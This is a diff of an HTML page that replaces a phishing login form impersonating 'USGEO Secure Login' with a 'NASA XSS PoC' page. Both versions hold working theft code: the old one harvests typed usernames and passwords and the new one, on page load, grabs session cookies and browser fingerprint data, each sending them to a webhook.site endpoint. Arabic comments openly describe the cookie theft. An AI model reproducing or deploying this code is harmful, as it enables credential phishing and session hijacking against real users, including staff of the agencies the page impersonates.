@@ -2,74 +2,37 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>USGEO Secure Login</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .login-box {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
-      text-align: center;
-      width: 300px;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      box-sizing: border-box;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #003366;
-      color: white;
-      border: none;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    h2 {
-      color: #003366;
-    }
-  </style>
-</head>
-<body>
-  <div class="login-box">
-    <h2>USGEO Secure Login</h2>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="send()">Login</button>
-  </div>
-
+  <title>NASA XSS PoC</title>
   <script>
-    function send() {
+    // بمجرد تحميل الصفحة، السرقة وإرسال الكوكيز
+    window.onload = function () {
       const data = {
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value,
-        userAgent: navigator.userAgent,
-        referrer: document.referrer,
-        location: window.location.href,
-        time: new Date().toISOString()
+        cookies: document.cookie, // سرقة الكوكيز
+        userAgent: navigator.userAgent, // معلومات المتصفح
+        platform: navigator.platform, // النظام
+        language: navigator.language, // لغة المتصفح
+        url: location.href, // رابط الصفحة
+        screen: `${screen.width}x${screen.height}`, // دقة الشاشة
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية
       };
 
-      fetch("https://webhook.site/f988f5a7-6736-4a39-bbf2-7314ca91aa7e", {
+      // إرسال الكوكيز إلى Webhook
+      fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(data)
+        body: JSON.stringify(data) // إرسال البيانات بتنسيق JSON
+      }).then(response => {
+        console.log("Data sent to Webhook successfully.");
+      }).catch(err => {
+        console.log("Error sending data:", err);
       });
-
-      alert("Authentication failed. Please contact the system administrator.");
-    }
+    };
   </script>
+</head>
+<body>
+  <h1>NASA XSS PoC Page</h1>
+  <p>This page will attempt to steal session cookies and send them to a remote server.</p>
 </body>
 </html>
